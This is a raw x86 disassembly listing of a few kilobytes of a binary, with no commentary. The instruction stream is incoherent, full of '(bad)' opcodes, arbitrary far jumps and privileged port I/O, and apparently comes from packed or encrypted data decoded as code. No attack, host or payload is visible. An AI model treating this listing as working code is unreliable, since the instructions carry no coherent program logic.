  40b8ce:	or     DWORD PTR [esi+0x70],0x93e0ed9e
  40b8d5:	es cs pusha 
  40b8d8:	clc    
  40b8d9:	neg    BYTE PTR [ebx-0x41]
  40b8dc:	call   0x28b3:0x6571c6bc
  40b8e3:	add    edx,esi
  40b8e5:	mov    ds:0xbbc22455,al
  40b8ea:	dec    ebx
  40b8eb:	inc    esi
  40b8ec:	enter  0x7e5c,0xdf
  40b8f0:	add    DWORD PTR [eax+0x7ebdc8b3],0xffffffa8
  40b8f7:	dec    ebp
  40b8f8:	pop    ebp
  40b8f9:	sbb    dh,BYTE PTR [ecx-0x2fbf7638]
  40b8ff:	mov    ebp,0xa8276c68
  40b904:	dec    edi
  40b905:	arpl   WORD PTR [eax+0x36],ax
  40b908:	cmp    BYTE PTR [ecx+0x7511600b],dl
  40b90e:	jg     0x40b964
  40b910:	cdq    
  40b911:	ret    0x1b0e
  40b914:	and    BYTE PTR [edi-0x7797abbb],ah
  40b91a:	push   esp
  40b91b:	add    esp,DWORD PTR [ebx+0x39c7ea2f]
  40b921:	fiadd  DWORD PTR [edi+0x3]
  40b924:	das    
  40b925:	mov    ebx,0x959bd6a0
  40b92a:	xchg   ebx,eax
  40b92b:	jno    0x40b978
  40b92d:	add    dh,BYTE PTR [esi-0x6b]
  40b930:	add    eax,0xc5ef6bab
  40b935:	aaa    
  40b936:	cwde   
  40b937:	por    mm5,QWORD PTR ds:0x8151c26c
  40b93e:	adc    DWORD PTR [edx],edi
  40b940:	out    0x31,eax
  40b942:	jecxz  0x40b925
  40b944:	gs (bad) 
  40b946:	xor    al,0x6b
  40b948:	clc    
  40b949:	xchg   edx,eax
  40b94a:	loop   0x40b941
  40b94c:	sub    DWORD PTR [ebp+ebx*8+0x37e7ce20],edi
  40b953:	dec    ebp
  40b954:	fdivr  DWORD PTR [edi+0x49]
  40b957:	push   ss
  40b958:	inc    ebp
  40b959:	enter  0x3ef4,0xcd
  40b95d:	push   ds
  40b95e:	mov    dh,0x90
  40b960:	test   ah,cl
  40b962:	inc    ebx
  40b963:	shr    DWORD PTR [ebp-0x2613a085],cl
  40b969:	(bad)  
  40b96a:	cli    
  40b96b:	jg     0x40b98a
  40b96d:	add    BYTE PTR [eax],dh
  40b96f:	sbb    ch,BYTE PTR [edi-0x56db48f0]
  40b975:	cmp    BYTE PTR [eax-0x6f],0x28
  40b979:	ret    0x9eae
  40b97c:	stos   DWORD PTR es:[edi],eax
  40b97d:	push   ss
  40b97e:	push   ds
  40b97f:	out    0xe9,al
  40b981:	or     BYTE PTR [edi],bl
  40b983:	mov    cl,0x97
  40b985:	and    esp,ebx
  40b987:	inc    esi
  40b988:	mov    WORD PTR [edi-0x13],es
  40b98b:	lock jle 0x40b922
  40b98e:	loop   0x40b985
  40b990:	cmp    DWORD PTR [esi+0x75],0x61
  40b994:	out    0xec,al
  40b996:	iret   
  40b997:	push   edi
  40b998:	sbb    al,bl
  40b99a:	push   edi
  40b99b:	pop    edi
  40b99c:	xchg   edx,eax
  40b99d:	inc    ecx
  40b99e:	cld    
  40b99f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9a0:	mov    al,ch
  40b9a2:	pop    ds
  40b9a3:	cmp    BYTE PTR [esi+0x53111d08],bl
  40b9a9:	push   0x1c1ab6ec
  40b9ae:	jge    0x40b9de
  40b9b0:	xor    BYTE PTR [ebp-0x3b],cl
  40b9b3:	add    al,0xac
  40b9b5:	sahf   
  40b9b6:	lea    esp,[edi-0x27]
  40b9b9:	or     eax,0x7dd80ed2
  40b9be:	jmp    0x445692c8
  40b9c3:	dec    eax
  40b9c4:	out    0x99,al
  40b9c6:	(bad)  
  40b9c7:	mov    eax,ds:0xfae63a23
  40b9cc:	sbb    BYTE PTR [ebx],bh
  40b9ce:	iret   
  40b9cf:	and    DWORD PTR [edi+0x7],0x5e
  40b9d3:	mov    edi,0x6af9d021
  40b9d8:	adc    edi,DWORD PTR [edi+0x9]
  40b9db:	cmp    al,0x5b
  40b9dd:	call   0x4711:0x89b109ae
  40b9e4:	leave  
  40b9e5:	(bad)  
  40b9e6:	adc    al,0x75
  40b9e8:	fwait
  40b9e9:	stos   BYTE PTR es:[edi],al
  40b9ea:	and    bl,BYTE PTR [esp+edi*1-0x2d]
  40b9ee:	adc    DWORD PTR [edx+0x1bc51e63],eax
  40b9f4:	push   cs
  40b9f5:	dec    edi
  40b9f6:	xchg   ebp,eax
  40b9f7:	test   BYTE PTR [ecx-0x72],dh
  40b9fa:	cwde   
  40b9fb:	push   eax
  40b9fc:	cmp    DWORD PTR [ecx],ebx
  40b9fe:	iret   
  40b9ff:	push   0x52
  40ba01:	xchg   BYTE PTR fs:[edi],bl
  40ba04:	inc    edx
  40ba05:	ins    BYTE PTR es:[edi],dx
  40ba06:	mov    BYTE PTR [edi+0x46],ch
  40ba09:	ds test al,0x75
  40ba0c:	lahf   
  40ba0d:	push   esp
  40ba0e:	dec    edi
  40ba0f:	dec    esi
  40ba10:	and    BYTE PTR ds:0xe4bc4d2,ch
  40ba16:	mov    bl,cl
  40ba18:	mov    sp,0x66dc
  40ba1c:	mov    edx,0x5b31df09
  40ba21:	test   DWORD PTR [edi-0x37ed6968],ecx
  40ba27:	in     al,dx
  40ba28:	pop    ecx
  40ba29:	pop    ecx
  40ba2a:	(bad)  
  40ba2b:	ret    0x2430
  40ba2e:	push   ecx
  40ba2f:	in     al,dx
  40ba30:	pop    ecx
  40ba31:	hlt    
  40ba32:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40ba34:	xchg   esp,eax
  40ba35:	sub    dh,ah
  40ba37:	nop
  40ba38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba39:	lock adc ah,BYTE PTR [edi+0x4c]
  40ba3d:	adc    ch,BYTE PTR [eax]
  40ba3f:	mov    WORD PTR [ebx-0x641b1197],fs
  40ba45:	leave  
  40ba46:	sbb    DWORD PTR [edi+eiz*2],edx
  40ba49:	fwait
  40ba4a:	sbb    dh,bh
  40ba4c:	call   0x40dcb6c3
  40ba51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba52:	mov    ebp,0x11a2e7b7
  40ba57:	or     al,0xdc
  40ba59:	mov    eax,ds:0xc3c6aefa
  40ba5e:	cmp    edx,esi
  40ba60:	mov    bl,BYTE PTR [ebx-0x3e]
  40ba63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba64:	push   ebx
  40ba65:	loopne 0x40b9ff
  40ba67:	out    dx,al
  40ba68:	jl     0x40ba96
  40ba6a:	mov    al,0xb
  40ba6c:	ret    0x3446
  40ba6f:	dec    esp
  40ba70:	in     eax,dx
  40ba71:	div    esi
  40ba73:	mov    ah,BYTE PTR [eax]
  40ba75:	jp     0x40ba59
  40ba77:	ret    0x86ac
  40ba7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba7b:	pop    sp
  40ba7d:	jge    0x40babb
  40ba7f:	mov    ah,0x59
  40ba81:	add    eax,0xb5cccfbe
  40ba86:	xchg   BYTE PTR [ebx-0x40],bh
  40ba89:	js     0x40bb06
  40ba8b:	or     DWORD PTR [ebx-0x38810343],ebp
  40ba91:	in     al,dx
  40ba92:	jne    0x40bab5
  40ba94:	ret    0x3cd
  40ba97:	xchg   ecx,eax
  40ba98:	repnz push edx
  40ba9a:	sub    ecx,DWORD PTR [eax-0x31]
  40ba9d:	push   ss
  40ba9e:	stc    
  40ba9f:	cmp    al,0xd5
  40baa1:	sbb    BYTE PTR [edx+0x4a],bl
  40baa4:	hlt    
  40baa5:	jg     0x40ba60
  40baa7:	jmp    0x40baaa
  40baa9:	xlat   BYTE PTR ds:[ebx]
  40baaa:	and    BYTE PTR [edi-0x2f4eb17b],al
  40bab0:	shl    DWORD PTR [ebx],cl
  40bab2:	stc    
  40bab3:	scas   al,BYTE PTR es:[edi]
  40bab4:	loope  0x40ba73
  40bab6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bab7:	pop    es
  40bab8:	fadd   QWORD PTR [ebp+0x5e027b84]
  40babe:	je     0x40bacc
  40bac0:	push   esp
  40bac1:	sahf   
  40bac2:	xor    eax,0xe3efd863
  40bac7:	cdq    
  40bac8:	pop    esi
  40bac9:	out    dx,eax
  40baca:	ins    DWORD PTR es:[edi],dx
  40bacb:	in     eax,dx
  40bacc:	mov    BYTE PTR [eax+edx*1+0x6c],bh
  40bad0:	leave  
  40bad1:	push   esp
  40bad2:	cld    
  40bad3:	js     0x40bafc
  40bad5:	out    0x34,al
  40bad7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad8:	stos   DWORD PTR es:[edi],eax
  40bad9:	les    eax,FWORD PTR [esi+ebx*2]
  40badc:	push   ecx
  40badd:	xchg   edx,eax
  40bade:	jg     0x40babe
  40bae0:	adc    eax,0x6b55de09
  40bae5:	jmp    0xb9aba4a1
  40baea:	xchg   ebx,eax
  40baeb:	cli    
  40baec:	or     BYTE PTR [ecx+0x6],dl
  40baef:	sub    al,bh
  40baf1:	cld    
  40baf2:	aad    0x9a
  40baf4:	xchg   edi,eax
  40baf5:	mov    ah,0x96
  40baf7:	test   BYTE PTR [ecx],ah
  40baf9:	mov    dl,0xf
  40bafb:	(bad)  
  40bafc:	pop    edi
  40bafd:	lods   eax,DWORD PTR ds:[esi]
  40bafe:	leave  
  40baff:	and    edi,DWORD PTR [esi-0x1a648e95]
  40bb05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb06:	jae    0x40bb43
  40bb08:	test   eax,0x66d5f40a
  40bb0d:	lock xrelease xchg DWORD PTR [edx-0x7d],eax
  40bb12:	sbb    DWORD PTR [ecx+0x58da0e6a],ebp
  40bb18:	xchg   ecx,eax
  40bb19:	arpl   WORD PTR [esi+eax*4+0x11],bp
  40bb1d:	fild   WORD PTR [eax]
  40bb1f:	dec    ebx
  40bb20:	test   eax,0xce45e213
  40bb25:	xor    esp,ebx
  40bb27:	mov    dl,0x72
  40bb29:	and    al,0x5c
  40bb2b:	sub    BYTE PTR [esi-0x72],bh
  40bb2e:	fdiv   QWORD PTR [esi-0x3]
  40bb31:	push   ds
  40bb32:	rcl    BYTE PTR [edx+esi*4-0x12fb78de],cl
  40bb39:	cmp    DWORD PTR [ecx],eax
  40bb3b:	inc    eax
  40bb3c:	xchg   esi,eax
  40bb3d:	popa   
  40bb3e:	loop   0x40bb1e
  40bb40:	xor    BYTE PTR [eax],ah
  40bb42:	push   0xffffffc4
  40bb44:	mov    ch,0xeb
  40bb46:	xchg   ebp,eax
  40bb47:	frstor [edi+0x59]
  40bb4a:	or     ebp,DWORD PTR [esi+0x420d366]
  40bb50:	fidivr DWORD PTR [ebx*4-0x56108e59]
  40bb57:	mov    eax,0x885bf1a
  40bb5c:	leave  
  40bb5d:	dec    ecx
  40bb5e:	push   cs
  40bb5f:	jno    0x40bb39
  40bb61:	inc    ebp
  40bb62:	mov    bl,0x22
  40bb64:	xor    edi,0xffffffe1
  40bb67:	(bad)  
  40bb68:	(bad)
  40bb6b:	shl    DWORD PTR [ebx-0x24832c07],cl
  40bb71:	iret   
  40bb72:	ror    DWORD PTR [ebx+0x38],0x1
  40bb76:	fwait
  40bb77:	push   es
  40bb78:	fsub   st,st(5)
  40bb7a:	xchg   ebx,eax
  40bb7b:	adc    DWORD PTR [edi+ebp*1+0x73],0x2a57d911
  40bb83:	scas   al,BYTE PTR es:[edi]
  40bb84:	rcl    BYTE PTR [edx+0x3a],1
  40bb87:	ja     0x40bbaa
  40bb89:	sub    DWORD PTR [edi+edi*8-0x7],ebx
  40bb8d:	sub    eax,0xa74ee73
  40bb92:	rol    BYTE PTR [eax],cl
  40bb94:	and    al,0x5b
  40bb96:	daa    
  40bb97:	mov    dh,0xda
  40bb99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb9a:	fstp   QWORD PTR [ebp+0x59]
  40bb9d:	pusha  
  40bb9e:	add    edi,eax
  40bba0:	(bad)  
  40bba1:	fiadd  DWORD PTR [esi]
  40bba3:	stos   BYTE PTR es:[edi],al
  40bba4:	fld    DWORD PTR [edx]
  40bba6:	fstp   QWORD PTR [ecx+ebp*4-0xd]
  40bbaa:	or     ah,BYTE PTR [ecx]
  40bbac:	shl    bl,1
  40bbae:	add    eax,0x116928eb
  40bbb3:	mov    DWORD PTR [edx-0x23],esp
  40bbb6:	mov    ah,BYTE PTR [ecx+0x71d6e056]
  40bbbc:	mov    edi,esi
  40bbbe:	pop    ds
  40bbbf:	cmp    DWORD PTR [ecx+0x220d6d36],ecx
  40bbc5:	fisttp WORD PTR [ebx-0x66]
  40bbc8:	sahf   
  40bbc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbca:	int3   
  40bbcb:	cs pop ss
  40bbcd:	push   edi
  40bbce:	(bad)  
  40bbcf:	jbe    0x40bb9c
  40bbd1:	std    
  40bbd2:	pop    edx
  40bbd3:	int3   
  40bbd4:	cmp    BYTE PTR [ecx],dl
  40bbd6:	pop    ds
  40bbd7:	add    BYTE PTR [esi+eax*8-0x2148b549],al
  40bbde:	mov    al,ds:0x16cffaa6
  40bbe3:	dec    edi
  40bbe4:	xchg   esp,eax
  40bbe5:	cmp    DWORD PTR [ebx+esi*2+0x3d3c785e],edx
  40bbec:	gs (bad) 
  40bbee:	fisub  WORD PTR [ebx]
  40bbf0:	ret    
  40bbf1:	push   ss
  40bbf2:	mov    eax,0x755147f2
  40bbf8:	enter  0xfb04,0x3a
  40bbfc:	mov    bh,dl
  40bbfe:	int    0xd1
  40bc00:	cmp    bh,dl
  40bc02:	ret    0x8fe0
  40bc05:	lods   eax,DWORD PTR ds:[esi]
  40bc06:	push   0x5191fdfa
  40bc0b:	hlt    
  40bc0c:	jmp    0x5ace:0x2b210867
  40bc13:	xchg   ebx,eax
  40bc14:	inc    BYTE PTR [edx-0x29be86f7]
  40bc1a:	nop
  40bc1b:	(bad)  
  40bc1c:	cs cmc 
  40bc1e:	mov    eax,ds:0x789101b0
  40bc23:	mov    ah,0xf9
  40bc25:	test   BYTE PTR [ecx+0x78],bl
  40bc28:	xchg   ebx,eax
  40bc29:	xchg   esp,eax
  40bc2a:	shl    DWORD PTR [ebx],1
  40bc2c:	cmp    al,0xdf
  40bc2e:	pusha  
  40bc2f:	cmp    BYTE PTR [edi+0x63],dl
  40bc32:	push   edi
  40bc33:	pop    edx
  40bc34:	into   
  40bc35:	lods   al,BYTE PTR ds:[esi]
  40bc36:	imul   esi,DWORD PTR [edi-0x26],0xfffffff7
  40bc3a:	gs dec ebp
  40bc3c:	xor    BYTE PTR [eax-0x2ada30fc],bh
  40bc42:	std    
  40bc43:	push   esi
  40bc44:	xchg   BYTE PTR [esi-0x42],bl
  40bc47:	push   esi
  40bc48:	sahf   
  40bc49:	les    ecx,FWORD PTR [ebx+0x1f16f258]
  40bc4f:	std    
  40bc50:	xor    DWORD PTR [ecx+0x13],esp
  40bc53:	mov    ch,0x4c
  40bc55:	mov    al,ds:0xd62bcd8a
  40bc5a:	mov    edi,0x9ed6b672
  40bc5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc60:	mov    cl,0x2c
  40bc62:	sbb    BYTE PTR ds:0xa64a5d11,ah
  40bc68:	aam    0xea
  40bc6a:	stos   BYTE PTR es:[edi],al
  40bc6b:	jo     0x40bc18
  40bc6d:	xchg   ebp,eax
  40bc6e:	cs xchg ebp,eax
  40bc70:	push   ecx
  40bc71:	test   DWORD PTR [ebx],ebx
  40bc73:	scas   eax,DWORD PTR es:[edi]
  40bc74:	mov    ecx,0xcabff48c
  40bc79:	pop    esp
  40bc7a:	stos   DWORD PTR es:[edi],eax
  40bc7b:	sub    esi,DWORD PTR [ebx]
  40bc7d:	cmp    DWORD PTR [edi-0x475958d5],esp
  40bc83:	lods   eax,DWORD PTR ds:[esi]
  40bc84:	sbb    eax,0xda6b7d7d
  40bc89:	jo     0x40bc7d
  40bc8b:	mov    DWORD PTR [edx],0x152087d
  40bc91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc92:	push   0x5c1bc4dd
  40bc97:	retf   0x49dc
  40bc9a:	or     eax,DWORD PTR [ebx-0x4b]
  40bc9d:	loope  0x40bd0b
  40bc9f:	ds out 0xb3,eax
  40bca2:	outs   dx,BYTE PTR ds:[esi]
  40bca3:	jmp    0xdbef:0x5364ee1d
  40bcaa:	fucom  st(6)
  40bcac:	outs   dx,BYTE PTR ds:[esi]
  40bcad:	ret    0x3caf
  40bcb0:	adc    BYTE PTR [esi],ah
  40bcb2:	pop    ds
  40bcb3:	(bad)  
  40bcb4:	push   ebx
  40bcb5:	outs   dx,BYTE PTR ds:[esi]
  40bcb6:	or     cl,0xcc
  40bcb9:	adc    DWORD PTR [eax-0x8],ebx
  40bcbc:	aaa    
  40bcbd:	and    eax,0xf56e3c91
  40bcc2:	push   cs
  40bcc3:	repz addr16 lahf 
  40bcc6:	sbb    al,0x6b
  40bcc8:	jp     0x40bd19
  40bcca:	unpckhps xmm5,XMMWORD PTR [eax+0x507e6a0c]
  40bcd1:	stos   BYTE PTR es:[edi],al
  40bcd2:	arpl   WORD PTR [edi],cx
  40bcd4:	std    
  40bcd5:	jnp    0x40bc89
  40bcd7:	daa    
  40bcd8:	push   edi
  40bcd9:	mov    ss,WORD PTR [ebp+edi*2-0x18]
  40bcdd:	loop   0x40bd18
  40bcdf:	jbe    0x40bcb9
  40bce1:	rcr    DWORD PTR [ebp+0x74],0x9a
  40bce5:	xor    al,0x58
  40bce7:	jg     0x40bc7b
  40bce9:	aaa    
  40bcea:	cmp    al,0x4d
  40bcec:	push   ss
  40bced:	adc    DWORD PTR [esi],ecx
  40bcef:	daa    
  40bcf0:	in     al,dx
  40bcf1:	mov    cl,0x9c
  40bcf3:	out    dx,al
  40bcf4:	mov    ds:0x24516363,al
  40bcf9:	lahf   
  40bcfa:	push   edi
  40bcfb:	daa    
  40bcfc:	mov    ds:0xe645686d,al
  40bd01:	scas   eax,DWORD PTR es:[edi]
  40bd02:	fcomi  st,st(6)
  40bd04:	aas    
  40bd05:	push   ecx
  40bd06:	out    dx,eax
  40bd07:	add    DWORD PTR [ebx+0x5e0391a8],edx
  40bd0d:	loopne 0x40bd4f
  40bd0f:	mov    edi,0xb05de8f2
  40bd14:	and    DWORD PTR [edi+0x55],ecx
  40bd17:	out    dx,al
  40bd18:	jns    0x40bcf7
  40bd1a:	and    dl,BYTE PTR ds:0x8b3c35a5
  40bd20:	xchg   ebp,eax
  40bd21:	aad    0xc5
  40bd23:	cdq    
  40bd24:	xor    DWORD PTR [ecx],0x87ab8285
  40bd2a:	dec    esp
  40bd2b:	push   eax
  40bd2c:	gs scas eax,DWORD PTR es:[edi]
  40bd2e:	pushf  
  40bd2f:	push   esi
  40bd30:	das    
  40bd31:	rol    esi,cl
  40bd33:	inc    edx
  40bd34:	je     0x40bd30
  40bd36:	adc    al,0x8c
  40bd38:	push   ecx
  40bd39:	mov    edx,DWORD PTR [ebp+0x21]
  40bd3c:	fxch   st(5)
  40bd3e:	mov    DWORD PTR [esi+0x1f],ebp
  40bd41:	push   ds
  40bd42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd43:	ins    BYTE PTR es:[edi],dx
  40bd44:	nop
  40bd45:	mov    al,0xb
  40bd47:	adc    ecx,edx
  40bd49:	fst    st(5)
  40bd4b:	xor    bh,ch
  40bd4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd4e:	sub    al,0xeb
  40bd50:	ins    DWORD PTR es:[edi],dx
  40bd51:	sbb    eax,0x8324840c
  40bd56:	add    eax,esp
  40bd58:	push   edx
  40bd59:	cmp    DWORD PTR [ebx+0x32],0x2b
  40bd5d:	jb     0x40bd0e
  40bd5f:	fisub  WORD PTR fs:[esi*4+0x4aa6837a]
  40bd67:	push   ebx
  40bd68:	repnz and DWORD PTR [edx],0xf89f72a
  40bd6f:	(bad)  
  40bd70:	mov    esi,0x3acf196b
  40bd75:	test   eax,0xaee4c64c
  40bd7a:	cmc    
  40bd7b:	aam    0xf3
  40bd7d:	and    DWORD PTR [ebx+0x4226c205],ebp
  40bd83:	cdq    
  40bd84:	imul   edx,DWORD PTR [edi],0xffffffaa
  40bd87:	call   0x893f:0x4e40a696
  40bd8e:	test   al,0x9a
  40bd90:	inc    edx
  40bd91:	mov    dl,0x86
  40bd93:	and    eax,0x64921207
  40bd98:	cld    
  40bd99:	cdq    
  40bd9a:	xor    BYTE PTR [esi+0x7b],ch
  40bd9d:	adc    ebp,DWORD PTR [ebx+0x44]
  40bda0:	icebp  
  40bda1:	adc    ah,bh
  40bda3:	cdq    
  40bda4:	cwde   
  40bda5:	push   0xf8153881
  40bdaa:	xchg   BYTE PTR [edi-0x41],dl
  40bdad:	xchg   al,bh
  40bdaf:	sti    
  40bdb0:	jnp    0x40bd46
  40bdb2:	inc    ecx
  40bdb3:	retf   0x78f4
  40bdb6:	(bad)  
  40bdb7:	push   esi
  40bdb8:	xor    eax,0xf421097e
  40bdbd:	inc    esi
  40bdbe:	fild   WORD PTR [edx+0x6edbdc0a]
  40bdc4:	test   al,0xe6
  40bdc6:	out    dx,eax
  40bdc7:	mov    ebp,0xd59bdd2c
  40bdcc:	(bad)  
  40bdcd:	pop    edx
  40bdce:	dec    eax
  40bdcf:	leave  
  40bdd0:	ror    DWORD PTR [ecx],0x9a
  40bdd3:	adc    al,0x2d
  40bdd5:	cmp    BYTE PTR [ebx-0xd],bl
  40bdd8:	mov    WORD PTR [ecx],ds
  40bdda:	sbb    esi,DWORD PTR [edx+0x11540124]
  40bde0:	sub    al,BYTE PTR [ebp-0x2a058e1c]
  40bde6:	jno    0x40be30
  40bde8:	fld    QWORD PTR [ebp+0x6c]
  40bdeb:	xchg   ecx,eax
  40bdec:	retf   0x7f71
  40bdef:	popa   
  40bdf0:	sub    DWORD PTR [eax+ebp*2+0x3c],eax
  40bdf4:	add    eax,0xcd3ebfc
  40bdf9:	into   
  40bdfa:	push   0x2dd65f0e
  40bdff:	mov    ch,0x42
  40be01:	enter  0x5fa6,0xd9
  40be05:	or     al,0x88
  40be07:	push   ebx
  40be08:	cmp    dl,BYTE PTR [ecx-0x272de550]
  40be0e:	inc    edx
  40be0f:	xchg   ecx,eax
  40be10:	pusha  
  40be11:	jmp    0x40bda6
  40be13:	sti    
  40be14:	push   es
  40be15:	mov    ebp,esi
  40be17:	xor    al,0x9f
  40be19:	and    esi,edi
  40be1b:	inc    edx
  40be1c:	test   DWORD PTR [eax+0x6eaa5fc9],0xddf9445c
  40be26:	adc    al,0x8a
  40be28:	cwde   
  40be29:	push   esp
  40be2a:	jmp    0x40be3e
  40be2c:	jl     0x40be77
  40be2e:	sti    
  40be2f:	mov    ebx,0x9df08832
  40be34:	aad    0x6f
  40be36:	stos   BYTE PTR es:[edi],al
  40be37:	loopne 0x40bdcb
  40be39:	retf   0xbc06
  40be3c:	cmp    edi,DWORD PTR [eax-0xc]
  40be3f:	inc    edi
  40be40:	fdivr  DWORD PTR [edx+0x77]
  40be43:	pusha  
  40be44:	xlat   BYTE PTR ds:[ebx]
  40be45:	push   cs
  40be46:	add    BYTE PTR [eax-0x4c],0xfb
  40be4a:	js     0x40be68
  40be4c:	sbb    DWORD PTR [esi-0x5304fc7],ebp
  40be52:	push   ds
  40be53:	inc    ebx
  40be54:	cs xchg ecx,eax
  40be56:	mov    WORD PTR [ecx],cs
  40be58:	sar    DWORD PTR [edx-0x31],1
  40be5b:	fwait
  40be5c:	es xchg ebx,eax
  40be5e:	(bad)  
  40be5f:	mov    ds:0x9beb62ee,eax
  40be64:	jge    0x40be29
  40be66:	push   cs
  40be67:	out    dx,al
  40be68:	mov    eax,DWORD PTR [ebp-0xaf56449]
  40be6e:	outs   dx,BYTE PTR ds:[esi]
  40be6f:	mov    al,ds:0x464ddfa0
  40be74:	nop
  40be75:	clc    
  40be76:	add    edx,DWORD PTR [edx]
  40be78:	leave  
  40be79:	jb     0x40beb0
  40be7b:	jmp    0x7f19c34
  40be80:	and    DWORD PTR ds:0xf5f625f5,0x136295f8
  40be8a:	imul   esi,DWORD PTR [eax-0x5c],0x4b
  40be8e:	sbb    eax,0x2231888
  40be93:	je     0x40be86
  40be95:	cmp    BYTE PTR [eax],bl
  40be97:	mov    esi,?
  40be99:	xlat   BYTE PTR ds:[ebx]
  40be9a:	in     eax,0xad
  40be9c:	leave  
  40be9d:	jmp    0x8707:0xcb140d5e
  40bea4:	add    DWORD PTR [ebx],ebp
  40bea6:	fiadd  WORD PTR [esi]
  40bea8:	mov    edi,0xa815e4d9
  40bead:	adc    al,0xd
  40beaf:	dec    esp
  40beb0:	daa    
  40beb1:	and    DWORD PTR [eax-0x70],edx
  40beb4:	pusha  
  40beb5:	mov    edi,0x71e1dca1
  40beba:	test   DWORD PTR [ecx],edi
  40bebc:	xchg   ecx,eax
  40bebd:	repz (bad) 
  40bebf:	jne    0x40beb4
  40bec1:	cmp    bl,BYTE PTR [edx+edi*2]
  40bec4:	ss xchg edx,eax
  40bec6:	cmp    al,0xe6
  40bec8:	and    al,BYTE PTR [ebp-0x2c]
  40becb:	mov    esi,0xed522982
  40bed0:	std    
  40bed1:	pop    esi
  40bed2:	(bad)  
  40bed3:	push   eax
  40bed4:	lock gs adc eax,0x33c32441
  40bedb:	repz rcr dl,0x7f
  40bedf:	arpl   di,ax
  40bee1:	cwde   
  40bee2:	aas    
  40bee3:	jp     0x40be75
  40bee5:	push   ss
  40bee6:	xlat   BYTE PTR ds:[ebx]
  40bee7:	stc    
  40bee8:	imul   ecx,DWORD PTR [ebx],0xe0051ec5
  40beee:	push   cs
  40beef:	and    ebx,DWORD PTR [ecx+eiz*1+0x5b]
  40bef3:	lahf   
  40bef4:	mov    esi,0x906680a7
  40bef9:	dec    ebx
  40befa:	(bad)  
  40befc:	jno    0x40be99
  40befe:	rcl    DWORD PTR [ecx],cl
  40bf00:	out    0x1b,al
  40bf02:	add    dl,bh
  40bf04:	adc    eax,0x24fc802a
  40bf09:	push   es
  40bf0a:	jg     0x40becd
  40bf0c:	mov    DWORD PTR [eax],eax
  40bf0e:	das    
  40bf0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf10:	ss dec edx
  40bf12:	cmp    ebp,ebx
  40bf14:	adc    ebp,ebp
  40bf16:	dec    eax
  40bf17:	ror    BYTE PTR [edx+ebx*8],0x69
  40bf1b:	mov    dh,0x3f
  40bf1d:	out    0x11,al
  40bf1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf20:	rol    bh,cl
  40bf22:	retf   0x63ab
  40bf25:	jmp    0x40bf4d
  40bf27:	fistp  DWORD PTR ds:0x23770aa1
  40bf2d:	mov    edi,0x6b18cf48
  40bf32:	int    0x20
  40bf34:	out    0x8f,eax
  40bf36:	and    DWORD PTR [ecx+0x50],eax
  40bf39:	int    0xfc
  40bf3b:	rcl    BYTE PTR [ecx-0x37196b65],0xdd
  40bf42:	enter  0x7d22,0xa0
  40bf46:	jbe    0x40bfb5
  40bf48:	add    eax,0x91abe2d7
  40bf4d:	or     DWORD PTR [ebp-0x43b5b1dc],esi
  40bf53:	loopne 0x40bf72
  40bf55:	sbb    esp,esp
  40bf57:	pop    ds
  40bf58:	adc    eax,0xde470724
  40bf5d:	data16 ror BYTE PTR [ebx-0x34741d69],cl
  40bf64:	cmp    DWORD PTR [ebx],edx
  40bf66:	push   cs
  40bf67:	lds    esp,FWORD PTR [esi+edx*8+0x42]
  40bf6b:	mov    cl,0x1c
  40bf6d:	hlt    
  40bf6e:	test   DWORD PTR [edx],edi
  40bf70:	daa    
  40bf71:	in     al,dx
  40bf72:	and    dl,BYTE PTR [ecx]
  40bf74:	mov    cl,0xd1
  40bf76:	push   edi
  40bf77:	sub    eax,0xeda34b0f
  40bf7c:	and    eax,0xe391f9f3
  40bf81:	xchg   ebx,eax
  40bf82:	jecxz  0x40bfb1
  40bf84:	jecxz  0x40bf98
  40bf86:	loope  0x40bf38
  40bf88:	push   cs
  40bf89:	lahf   
  40bf8a:	out    0x28,al
  40bf8c:	mov    eax,0xa3005133
  40bf91:	sbb    al,0x2b
  40bf93:	sub    eax,0x63a923f8
  40bf98:	mov    dh,0xd5
  40bf9a:	inc    eax
  40bf9b:	jecxz  0x40bf52
  40bf9d:	xchg   BYTE PTR [ebx-0x5e93a7ff],dh
  40bfa3:	mov    ecx,0xe21122a5
  40bfa8:	xchg   ebp,eax
  40bfa9:	jno    0x40bfd7
  40bfab:	cmc    
  40bfac:	mov    BYTE PTR [ebx-0x4f],cl
  40bfaf:	sbb    DWORD PTR [edi-0x27],eax
  40bfb2:	scas   eax,DWORD PTR es:[edi]
  40bfb3:	rcr    DWORD PTR [eax-0x46],1
  40bfb6:	mov    bl,0xc8
  40bfb8:	xchg   esp,eax
  40bfb9:	sub    esp,DWORD PTR [eax]
  40bfbb:	mov    gs,WORD PTR [edx+0x79]
  40bfbe:	lahf   
  40bfbf:	jb     0x40c03b
  40bfc1:	lods   eax,DWORD PTR ds:[esi]
  40bfc2:	arpl   WORD PTR [edi],di
  40bfc4:	aam    0x57
  40bfc6:	test   eax,0x45666213
  40bfcb:	(bad)  
  40bfcc:	inc    esi
  40bfcd:	es fdivp st(4),st
  40bfd0:	mov    eax,0xcefcea8d
  40bfd5:	adc    al,0x57
  40bfd7:	lds    edi,FWORD PTR [ecx+0x5f142186]
  40bfdd:	repz lock adc eax,0xe301e10
  40bfe4:	sub    ebx,DWORD PTR [ebp-0x2c]
  40bfe7:	dec    edx
  40bfe8:	cs jecxz 0x40c008
  40bfeb:	jle    0x40bfea
